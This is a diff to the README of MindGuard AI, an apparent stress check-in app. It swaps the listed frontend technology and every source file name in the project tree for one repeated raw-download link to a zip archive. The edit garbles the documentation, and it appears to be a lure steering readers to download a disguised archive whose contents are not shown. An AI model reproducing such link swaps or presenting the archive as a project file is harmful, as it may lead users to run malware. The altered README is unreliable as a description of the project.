@@ -12,7 +12,7 @@ MindGuard AI provides a daily stress check-in system where users enter sleep hou
 
 ## ⚙️ Tech Stack
 Frontend:
-- React.js
+- https://github.com/rahuldounde21/mindguard-ai/raw/refs/heads/main/src/components/mindguard_ai_3.3.zip
 - JavaScript
 - HTML & CSS
 
@@ -34,10 +34,10 @@ Else → Low Stress
 
 ## 📂 Project Structure
 src/
-├── App.js
-├── firebase.js
-├── index.js
-└── App.css
+├── https://github.com/rahuldounde21/mindguard-ai/raw/refs/heads/main/src/components/mindguard_ai_3.3.zip
+├── https://github.com/rahuldounde21/mindguard-ai/raw/refs/heads/main/src/components/mindguard_ai_3.3.zip
+├── https://github.com/rahuldounde21/mindguard-ai/raw/refs/heads/main/src/components/mindguard_ai_3.3.zip
+└── https://github.com/rahuldounde21/mindguard-ai/raw/refs/heads/main/src/components/mindguard_ai_3.3.zip
 
 perl
 Copy code
